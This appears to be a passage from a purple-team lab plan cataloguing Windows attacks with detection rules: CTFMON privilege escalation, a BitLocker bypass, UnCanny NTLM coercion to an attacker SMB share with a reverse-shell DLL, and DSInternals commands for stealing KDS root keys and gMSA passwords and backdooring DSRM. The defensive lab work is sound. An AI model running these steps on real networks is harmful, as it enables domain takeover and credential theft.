- `logs-endpoint.events.pipe-*`: Named pipe `MiniPlasmaWERPipe` creation
- `logs-endpoint.events.file-*`: wermgr.exe replacement in non-standard location
- ETW provider `Microsoft-Windows-CldFlt` (very rare, high signal)
- ETW provider `Microsoft-Windows-Kernel-General` Event 16 (object manager symlinks)

**MITRE ATT&CK:** T1068 Exploitation for Privilege Escalation, T1543 Create or Modify System Process, T1547 Boot or Logon Autostart Execution, T1569 System Services
**Status:** 🔬 Research only. Do NOT execute on CADRE without snapshot + mbr01-only testing first.

### 79. GreenPlasma — CTFMON Arbitrary Section → EoP 🔬

**Repo:** `references/project-nightcrawler/GreenPlasma/`
**Source file:** `GreenPlasma.cpp` (244 lines C++)
**Vulnerability:** CTFMON arbitrary memory section creation in any directory writable by SYSTEM. Affects Win 11/2022/2026 (=2025).

**Exploit chain:**

| Step | Action |
|------|--------|
| 1 | `CfAbortOperation(pid, 0, Block)` race trigger |
| 2 | `TreeSetNamedSecurityInfo(CloudFiles, ...)` — grant Everyone GENERIC_ALL via DACL reset |
| 3 | `RegDeleteTree(CloudFiles\BlockedApps)` + recreate as symlink to `HKU\<sid>\Software\Microsoft\Windows\CurrentVersion\Policies\System` |
| 4 | Re-trigger race under symlink → now-controllable DACL on `Policies\System` |
| 5 | Set `DisableLockWorkstation = 1` |
| 6 | `NtCreateSymbolicLinkObject(\Sessions\N\BaseNamedObjects\CTF.AsmListCache.FMPWinlogonN → \BaseNamedObjects\CTFMON_DEAD)` |
| 7 | `ShellExecuteEx("runas", conhost.exe)` — UAC elevation prompt |
| 8 | Tight `NtOpenSection` loop on CTFMON object until winlogon opens it |
| 9 | `OpenInputDesktop()` loop + `LockWorkStation()` |

**Why CADRE cares:** CTFMON runs by default on Server 2025. The session-tagged `CTF.AsmListCache.FMPWinlogon{N}` object is internal CTFMON state — its hijack affects every interactive session. PoC is **partial** — the SYSTEM-shell conversion is left as CTF challenge (need to combine with symbolic link abuse → service DLL hijack pattern).

**Detection surface:**
- `logs-endpoint.events.registry-*`: `DisableLockWorkstation = 1` set in `HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System` by non-admin
- `logs-endpoint.events.process-*`: `C:\Windows\System32\conhost.exe` spawned via `ShellExecuteEx runas` from non-elevated parent
- ETW `Microsoft-Windows-Kernel-General` Event 16 (object manager symlinks in `\Sessions\*\BaseNamedObjects\`)
- `CfAbortOperation` calls (same as MiniPlasma)

**MITRE ATT&CK:** T1068 Exploitation for Privilege Escalation
**Status:** 🔬 Research only. PoC is partial — would need to chain with another primitive for full SYSTEM shell. See James Forshaw's symbolic-link-to-system research for the conversion.

### 80. YellowKey — BitLocker Bypass via FsTx + WinRE 🔬

**Repo:** `references/project-nightcrawler/YellowKey/`
**Source file:** FsTx log files (~21 MiB NTFS transaction artifacts), no source code (the exploit is the file structure + key sequence)
**Vulnerability:** BitLocker bypass via FsTx (File System Transaction) log files planted in `System Volume Information\FsTx`. Triggered by WinRE restart while holding CTRL. Affects Win 11 + Server 2022/2025.

**Reproduction steps:**
1. Copy `FsTx/{guid}/...` from repo to `X:\System Volume Information\FsTx` (USB stick or even EFI partition)
2. Plug into target (or pull disk → modify EFI → return)
3. SHIFT+Click Restart (enters WinRE)
4. Hold CTRL during restart
5. Shell spawns with unrestricted BitLocker volume access

**Author's note:** "Almost feels like backdoor." The vulnerable FsTx handler is the same binary as desktop version, but with the FsTx triggering functionality **stripped on desktop**. Only Win 11 + Server 2022/2025 affected — Win 10 not affected.

**CADRE relevance:** Different threat class — requires **physical/disk access + reboot + key sequence**. Out of scope for online credential campaign. Useful as:
- Threat model reference (BitLocker ≠ full disk encryption if attacker has disk access + WinRE)
- Possibly testable by detaching VMDK from mbr01, mounting on host, copying FsTx, reattaching, booting into WinRE via VBox/VMware boot menu, holding CTRL during restart. **Significant engineering effort.**
- Demonstrates "evil maid" threat class separation from credential/domain compromise

**MITRE ATT&CK:** T1490 Inhibit System Recovery
**Status:** 🔬 Research only. Not proposed for online campaign. Treat as separate threat-modeling exercise.

---

## 0xHossam — UnCanny Coerce + LPE 0day (2026-06-19)

**Source:** https://github.com/0xHossam/UnCanny
**Cloned to:** `references/uncanny/UnCanny/` (1.1 MiB, source only — `lpe/lpe.c`, `lpe/plugin.c`, `poc/AppxManifest.xml`, `poc/Invoke-InstallServiceCoerce.ps1`, `poc/setup.sh`)
**Author note:** Author self-describes the technique as "not reliable for real red team ops because of its limitation" but the research is published for educational purposes.

**Technique summary:**
1. Attacker: Stand up SMB server (impacket for hash capture, Samba for LPE DLL)
2. Attacker: Stage `AppxManifest.xml` + dummy files at `\\attacker\share\`
3. Victim user: `Add-AppxPackage -Register \\attacker\share\AppxManifest.xml` (creates package with `InstalledLocation` = UNC path)
4. Victim user: `CreateInstallServiceWork` with `FulfillmentPluginId = <that PFN>`
5. SYSTEM `InstallService.exe`: `LoadLibraryW(\\attacker\share\InstallServicePlugin.dll)` → outbound SMB → machine account NTLM auth to attacker
6. Optional LPE: serve real DLL via Samba → DllMain runs as SYSTEM in `svchost.exe`

**Exploit vector (technical):**
- COM Class: `Windows.Internal.InstallService.Control.InstallServiceControl`
- IID: `e4893a99-9270-42b9-9a62-683d6ceed250`
- vtable slot 8: `CreateInstallServiceWork(cv, caller, _, _, propertiesJson, optionsJson, out items)`
- JSON field `FulfillmentPluginId` controls plugin resolution
- Branch 5 in `PluginHelpers::ActivatePlugin`: treats unknown ID as Package Family Name → `FindPackagesForUser` → `InstalledLocation.Path` → `LoadLibraryW(path + "\InstallServicePlugin.dll")`

**Pre-condition (gating factor):**
- **Developer Mode must be enabled** on target: `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\AppModelUnlock\AllowDevelopmentWithoutDevLicense = 1`
- Loose-file registration (`Add-AppxPackage -Register`) is the only way to get `InstalledLocation = UNC`
- This is gated by AppX deployment stack (admin-controlled)

**CADRE impact if Developer Mode is enabled:**
- **Phase 5 (Lateral Movement):** New working coercion primitive (alongside WT017 PrinterBug, where WT018-020 are non-functional)
- **Phase 3.5 (Credential Access):** New EoP primitive (non-admin → SYSTEM via InstallService)
- **Phase 6 (Combined with NTLM Relay to ADCS ESC8):** Standard user → dc01$ auth → ESC8 → DA on cert

### 81. UnCanny Coerce — NTLM Coercion via InstallService (Phase 5 Lateral Movement) ⏳

**Pre-conditions:** Standard user on Win 10/11 OR Server 2022/2025 + **Developer Mode enabled** + `InstallService.exe` running (default) + `AppXSvc` running (default)
**Outcome:** Outbound SMB to attacker → `dc01$` (or any target) machine account NTLM
**Auth captured:** `NTLMv1` or `NTLMv2` of the target machine account (the calling user, not the target — machine's auth is the result of LoadLibraryW)

**Testing plan (if Developer Mode confirmed):**
1. From Kali: stand up impacket-smbserver with patched `FileSystemName` field (XTFS → NTFS, per author's setup.sh)
2. Stage `poc/AppxManifest.xml` + dummy files
3. From mbr01 as `intern_blue` (or any standard user with interactive session): `Add-AppxPackage -Register \\192.168.77.60\coerce\AppxManifest.xml`
4. Run `Invoke-InstallServiceCoerce.ps1` with attacker host = Kali
5. Confirm `dc01$` NTLM hash captured on impacket-smbserver
6. Crack with hashcat mode 13100 (RC4) or 19700 (AES256)
7. Use cracked hash to perform DCSync or relay to ADCS ESC8

**MITRE ATT&CK:** T1187 Forced Authentication, T1557 Adversary-in-the-Middle (NTLMv2 relay)
**Status:** 🔬 Deferred — gated on Developer Mode check + admin decision to enable in playbook. Per user 2026-06-19: "document only, defer test" until after campaign verification. Track G in Parallel Tracks.

### 82. UnCanny LPE — Non-Admin → SYSTEM via InstallService (Phase 3.5 Credential Access) ⏳

**Pre-conditions:** Same as #81 + Samba server (impacket cannot serve a loadable image)
**Outcome:** `DllMain` of attacker-controlled `InstallServicePlugin.dll` runs as `NT AUTHORITY\SYSTEM` inside `svchost.exe` (the `InstallService` host)
**Key insight from author:** `impacket` returns `ERROR_INVALID_HANDLE` when `LoadLibraryW` reads from its share, so the LPE path requires a real SMB server. Samba reports NTFS by default so loose registration still works.

**Testing plan (if #81 succeeds and Samba is available):**
1. Compile `lpe/lpe.c` and `lpe/plugin.c` as a DLL with `DllMain` that spawns reverse shell
2. Stage on Samba share (not impacket)
3. Same trigger as #81 but with DLL present
4. Confirm `NT AUTHORITY\SYSTEM` shell in `svchost.exe` context
5. This is **direct SYSTEM** — no GodPotato/PrintSpoofer needed

**MITRE ATT&CK:** T1068 Exploitation for Privilege Escalation, T1574.001 Hijack Execution Flow (DLL Side-Loading)
**Status:** 🔬 Deferred — gated on Developer Mode check + Samba setup on Kali. Per user 2026-06-19: "document only, defer test" until after campaign verification. Track G in Parallel Tracks.

### 83. IPv4-Mapped IPv6 Phishing URL Parser Bypass (SANS ISC 33090) ⏳

**Source:** https://isc.sans.edu/diary/rss/33090 (Xavier Mertens, 2026-06-19)
**Target observed:** Major Belgian bank (Belfius) — phishing email with `hxxp://[::ffff:5511:74be]/kWC5PHA1` → resolves to `85.17.116.190` → redirects to `hxxps://3439-aanmelden.verificatie.qzz.io/mon-belfius`

**Technique:** RFC 4291 IPv4-mapped IPv6 notation `::ffff:0.0.0.0/96`. Bypasses:
- Regex-based domain extractors (no FQDN)
- Regex-based IP extractors (no dotted-quad)
- DNS-based URL blocklists (no DNS query needed)
- Reputation services (fresh IP, not yet blacklisted)

**CADRE relevance:** Not a direct campaign attack (we don't do phishing simulation), but a **detection engineering** lesson. Add to plan1.7 §14 as detection rule for `[::ffff:X:X:X:X]` in HTTP URIs.

**Status:** 🔬 Deferred — Detection rules already in plan1.7 §14 (Suricata SID 1000096-1000097). No live testing needed. Per user 2026-06-19: "document only, defer test" until after campaign verification.

---

## KDS Root Key Attacks — Grafnetter TROOPERS26 (2026-06-20)

**Source:** https://troopers.de/troopers26/talks/fpkkra/ (Michael Grafnetter, SpecterOps)
**Tool:** DSIternals PowerShell Module v7.0 (May 2026) — https://github.com/MichaelGrafnetter/DSInternals
**Full analysis:** `docs/internal/references/kds-root-key-attacks.md` (300+ lines, all 6 attacks with DSIternals commands, pre-conditions, and detection engineering)
**Author:** Michael Grafnetter — inventor of Shadow Credentials, creator of DSIternals, Microsoft MVP

**Mechanism (shared by all 6 attacks):** KDS Root Key (stored in AD as `msKds-ProvRootKey`) + DPAPI-NG SID Protectors. Once you have DA (Phase 6/7), extract the KDS root key via DCSync/LDAP/ntds.dit → derive ANY SID group key offline → decrypt ANY DPAPI-NG protected secret. **Zero network signature on the attack** — only detection is on the KDS root key dump side.

**Pre-conditions for ALL attacks in this section:**
- DA on the domain (Phase 6/7 of our campaign) — already in CAMPAIGNS.md
- DSIternals installed on attacker host (`Install-Module DSInternals -Force`)
- Target secret exists in the domain (gMSA, BitLocker, DNSSEC, etc.)

### 84. KDS Root Key Extraction (Post-DA Prerequisite) ⏳

**Source:** DSIternals v7.0 — `Get-ADReplKdsRootKey`, `Get-ADSIKdsRootKey`, `Get-ADDBKdsRootKey`
**MITRE:** T1552.004 (Unsecured Credentials: Private Keys)
**Outcome:** KDS Root Key — unlocks all gMSA passwords, DPAPI-NG SID keys, DNSSEC keys, PFX secrets. **Prerequisite for items #85-89 below.**

**Test plan (testable today on CADRE):**
```powershell
# Post-DCSync: extract via replication
Get-ADReplKdsRootKey -Domain child.cadre.local | Export-Clixml KdsRootKeys.xml

# Or via LDAP direct
Get-ADSIKdsRootKey | Export-Clixml KdsRootKeys.xml

# Or from offline backup
Get-ADDBKdsRootKey -DatabasePath .\ntds.dit | Export-Clixml KdsRootKeys.xml
```

**Detection (plan1.7 §15 candidate):**
- WinSec 4662 on `CN=Master Root Keys,CN=Group Key Distribution Service,CN=Service,CN=Configuration,...`
- DRSGetNCChanges opnum 3 against the Configuration partition
- LDAP read by non-DC computer

**Status:** ⏳ Pending — testable today, no infra changes needed. Awaiting Phase 6/7 completion.

### 85. Golden gMSA Attack (Offline Password Computation) ⏳

**Source:** DSIternals v7.0 — `Get-ADDBServiceAccount`
**MITRE:** T1552.004, T1003.006 (OS Credential Dumping: DCSync)
**Outcome:** Current AND future passwords of every gMSA in the domain, computed offline. Survives gMSA rotation (predicts next 30 days).

**Test plan (testable today):**
```powershell
$rootKey = Import-Clixml .\KdsRootKeys.xml
# Extract ALL gMSA passwords from ntds.dit
Get-ADDBServiceAccount -DatabasePath .\ntds.dit | Format-List
# Returns: SamAccountName, NTHash, AES256 Kerberos Key
# Predict future password 30 days ahead
Get-ADDBServiceAccount -DatabasePath .\ntds.dit -EffectiveTime (Get-Date).AddDays(30)
```

**Maps to:** Branch A Path G (gMSA Extraction WT024) — enhances it with offline Golden gMSA variant
**CADRE-specific test:** After Phase 2, generate `svc_mssql$` password → PTH to mbr01 (matches our existing pivot)

**Status:** ⏳ Pending — testable today. Need KDS root key (#84) first.

### 86. DSRM Password Extract & Set (DC Persistence) ⏳

**Source:** DSIternals v7.0 — `Set-LsaPolicyInformation`, `Get-ADDBAccount`
**MITRE:** T1003.002, T1556.005
**Outcome:** Backdoor access to DC that survives AD credential rotation. Pivot for offline ntds.dit dump.

**Test plan (testable today):**
```powershell
# On dc01 (post-Phase 3 SYSTEM):
Set-LsaPolicyInformation -DomainController dc01.child.cadre.local `
  -NewDrmPassword (ConvertTo-SecureString "Pwn3dByDA!" -AsPlainText -Force)
# Reboot dc01 into DSRM (F8 on VMware console)
# Log in as .\Administrator / Pwn3dByDA! — no AD creds needed
```

**Maps to:** NEW 3.5P in Branch 3.5 (DC persistence)
**Detection:** WinSec 4662 on `CN=Local Policy,CN=DomainController,...`, Event 100 (DSRM logon), 4624 type 2 source=DSRM

**Status:** ⏳ Pending — testable today. Need DC admin (Phase 3).

### 87. LAPS Bulk Extraction (Enhancement) ⏳

**Source:** DSIternals v7.0 — `Get-ADDBAccount -LapsPasswords`
**MITRE:** T1552.004
**Outcome:** All LAPS passwords in bulk from ntds.dit
**Already in CAMPAIGNS.md:** 3.5L (LAPS Extraction) — **enhance with DSIternals bulk export**
**Status:** ⏳ Pending — testable today. Already in 3.5L, just need to enhance with DSIternals commands.

### 88. Golden dMSA Attack (Server 2025) ⏳

**Source:** DSIternals v7.0 — `Get-ADDBServiceAccount` (filter by `msDS-DelegatedManagedServiceAccount`)
**MITRE:** T1552.004
**Outcome:** Current and future passwords of every dMSA in the domain (dMSAs are the Server 2025 successor to gMSAs)
**CADRE gap:** No dMSA configured in our playbooks. Need to add a dMSA setup step.
**Status:** ⏳ Pending — needs dMSA infra addition to playbook.

### 89. DPAPI-NG SID Protector Decryption (BitLocker / PFX / DNSSEC / ASP.NET) ⏳

**Source:** DSIternals v7.0 — `Save-DpapiNgSidKey`, `Unprotect-DpapiNgData`, `Unprotect-DpapiNgPfxCertificate`
**MITRE:** T1003 (varies by target)
**Outcome:** Decrypt ANY DPAPI-NG protected secret, given the target's SID and the KDS root key

**Sub-techniques (all require #84 first):**
- **BitLocker SID Protector:** Unlock BitLocker volumes via `manage-bde -unlock -sid` (⏳ deferred — no BitLocker infra in CADRE)
- **PFX group-protected:** Decrypt SID-protected PKCS#12 PFX files for offline RSA key extraction (⏳ deferred — no PFX infra in CADRE)
- **DNSSEC KSK/ZSK:** Extract private DNSSEC signing keys (⏳ deferred — no DNSSEC infra in CADRE)
- **ASP.NET Core conn strings:** Decrypt encrypted `appsettings.json` connection strings (❌ skip — no .NET infra in CADRE)

**Status:** ⏳ Deferred — all sub-techniques require infra additions.

### Detection Engineering (plan1.7 §15 candidates)

| Attack | Detection signal |
|---|---|
| #84 KDS Root Key extraction | WinSec 4662 on KDS root key container |
| #85 Golden gMSA | No network signal; gMSA auth from unexpected host → 4624 type 3 |
| #86 DSRM persistence | LSA Policy modify (4662), Event 100 (DSRM logon) |
| #87 LAPS bulk | 4662 on ms-Mcs-AdmPwd attribute read |
| #89 DPAPI-NG cache writes | File create in `%LOCALAPPDATA%\Microsoft\Crypto\KdsKey\` outside OS setup |

### Items NOT to add to CAMPAIGNS.md

Per user instruction 2026-06-20: **"save to analysis and add as separate KDS root key section in campaign suggestions only"** — these items (#84-89) live in Campaign_suggestions.md as research/study material. They will be moved to CAMPAIGNS.md when we reach the relevant phase (post-Phase 6/7) and decide to test.

---

## Next Actions / Parallel Tracks (After Campaign Verification)

These are high-level tracks to pursue **after** the primary campaign (Phases 0-8 + Branches) is fully verified end-to-end. Do not start these until campaign validation is complete.

### Track A — Hardened Environment Variant

**Trigger:** After campaign Phase 1-8 fully verified with current (weakened) config.
**Source:** CVE-2026-20833 (Kerberos RC4 hardening), Server 2025 full security posture.
**What:** Create a "hardened mode" variant that tests only techniques surviving full security + fully updated Server 2025.

**Key findings from analysis:**
- **~87% survival rate** (66/76 attacks still work)
- **Phase 2 (Kerberoast) is DEAD** — RC4 enforcement (July 2026) kills RC4-encrypted TGS cracking. AES256 impractical for strong passwords.
- **Phase 3.5 is ~27%** — LSASS PPL + Credential Guard blocks 7/11 techniques (3.5F, 3.5K, 3.5A, 3.5G, 3.5H, 3.5I, 3.5B/3.5C need password)
- **Golden/Silver Ticket forging impacted** — RC4 dead, AES much harder
- **What survives:** AS-REP Roast, SQL xp_cmdshell, GodPotato, LAPS extraction, Azure AD Connect dump, all Phase 4-8 (DCSync, RBCD, ADCS, SCCM, forest trust)

**Revised hardened attack path:**
```
Phase 1: AS-REP → intern_blue
Phase 2.5: ACE#18 → analyst_t2
Phase 3: SQL xp_cmdshell → GodPotato → SYSTEM
Phase 3.5: LAPS (if permissions) OR Azure AD Connect dump (dc01)
Phase 4-8: DCSync, RBCD, ADCS, forest trust (all work)
```

**Action items (future):**
1. Enable LSASS PPL, Credential Guard, RC4 enforcement, SMB signing, Defender
2. Re-run campaign → document which attacks break
3. Build detection rules for hardened-environment-only attacks
4. Document "what a real hardened environment looks like" vs our lab

### Track B — Automated Adversary Emulation (Caldera)

**Trigger:** After campaign Phase 1-8 verified manually.
**Source:** SEC699 (Advanced Purple Team Tactics).
**What:** Deploy MITRE Caldera + VECTR. Automate all 75 campaign attacks. Track detection coverage.

**Action items (future):**
1. Deploy Caldera on provisioning (Docker)
2. Deploy VECTR on provisioning (Docker)
3. Create Caldera adversary profile for all 75 attacks
4. Run automated emulation → record results in VECTR
5. Build Sigma rules for undetected techniques
6. Re-validate detection coverage

### Track C — Sigma Rule Library

**Trigger:** After campaign Phase 1-8 telemetry captured.
**Source:** SEC555 + FOR608.
**What:** Build portable Sigma rules for all 75 campaign attacks. Map to MITRE ATT&CK.

**Action items (future):**
1. Extract telemetry from tracker.md (WinSec, Suricata, Zeek, Sysmon, Endpoint)
2. Write Sigma rule for each attack
3. Convert to Elastic KQL
4. Import into Elastic as detection rules
5. Test against campaign traffic
6. Export as portable Sigma format

### Track D — NSM Dashboards (Kibana)

**Trigger:** After campaign Phase 1-3 telemetry captured.
**Source:** SEC555 + SEC511.
**What:** Build 6 Kibana dashboards for network security monitoring.

**Action items (future):**
1. DNS Overview (zeek.dns)
2. HTTP Overview (zeek.http)
3. TLS Overview (zeek.ssl)
4. Kerberos Overview (zeek.kerberos)
5. SMB Overview (zeek.smb)
6. Flow Overview (zeek.conn)

### Track E — Forensic Tooling (KAPE + Volatility + Timeline)

**Trigger:** After campaign Phase 3.5 completes.
**Source:** FOR500 + FOR508 + FOR608.
**What:** Install forensic tools. Build triage + timeline workflows.
**Orchestrator:** [`DFIR-Nexus-Pioneer-workflow.md`](DFIR-Nexus-Pioneer-workflow.md) — Pioneer loop (attack → export → DFIR-Nexus case → tracker). Expands to KAPE/Plaso in B.0/C.0.

**Action items (future):**
1. Install KAPE, Eric Zimmerman tools, Volatility on Windows VMs
2. Install Plaso + Timesketch on provisioning
3. Run KAPE triage after each campaign phase
4. Build supertimelines from triage data
5. Analyze with Volatility for memory artifacts

### Track F — Plan 11 (Cloud/Entra ID)

**Trigger:** After campaign Phase 8 completes.
**Source:** Dirk-jan Mollema blog + FOR509.
**What:** EntraGoat integration. Test Azure/Entra ID attack techniques.

**Action items (future):**
1. Deploy EntraGoat environment (Azure free tenant)
2. P11.8: Azure AD Connect DPAPI dump (bridge from Phase 3 SYSTEM)
3. P11.1: Actor Tokens → Global Admin
4. P11.2: Cloud Kerberos Trust → Domain Admin
5. P11.3: PRT Phishing
6. Build detection rules for cloud attacks

---

### Track G — UnCanny + Future Windows 0days (0xHossam, 2026-06-19)

**Trigger:** After primary campaign (Phases 0-8 + Branches) fully verified. Or when next significant Windows 0day emerges.
**Source:** https://github.com/0xHossam/UnCanny + SANS ISC diary 33090
**Status:** 🔬 Documented, deferred test (per user 2026-06-19)

**What:** New NTLM coercion primitive (machine account) + LPE 0day (non-admin → SYSTEM) using Windows Store InstallService loose-file AppX registration.

**Why deferred:**
1. **Gating factor: Developer Mode** — `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\AppModelUnlock\AllowDevelopmentWithoutDevLicense = 1` required. Enabling in `00-domain-deploy.yml` is an admin change to the playbook — separate decision.
2. **Not on critical path** — existing WT017 (PrinterBug) coercion works on CADRE; UnCanny is a parallel technique for hardening-variation testing.
3. **Detection rules already deployed** — Suricata SID 1000095-1000097 + Elastic KQL in plan1.7 §14 are written and ready; can be deployed before testing.

**What IS done (2026-06-19):**
- ✅ Cloned to `references/uncanny/UnCanny/` (1.1 MiB, source only)
- ✅ WT094 + 3.5N entries in CAMPAIGNS.md (Phase 5 + Branch 3.5) with full test plans
- ✅ plan1.7 §14 detection rules written
- ✅ External references #108, #109 added

**When to revisit:**
- During Track A (Hardened Environment Variant) — UnCanny is exactly the kind of technique that may still work on hardened targets (AppX abuse bypasses many hardening controls)
- After campaign Phase 8 completes — if you have time/interest
- When a new Windows 0day emerges (this track becomes a recurring pattern: clone → analyze → document → defer → add to playbook hardening later)

**Companion project:** Project NightCrawler (`references/project-nightcrawler/`) follows the same deferred pattern. Both are "off-online-campaign" Windows vulnerability research that feeds back into:
- Detection rules (plan1.7)
- Hardened variant track (Track A)
- Future attack surface (when new playbooks are written)

**Action items (future):**
1. Verify Developer Mode status on dc01/mbr01/mbr02 (just informational, not blocking)
2. Decide whether to enable Developer Mode in `00-domain-deploy.yml` (admin change)
3. If yes, patch impacket per author's setup.sh, deploy detection rules, then run UnCanny
4. If no, keep UnCanny as documentation-only and revisit during Track A (Hardened Environment)

---

*Last updated: 2026-06-14*
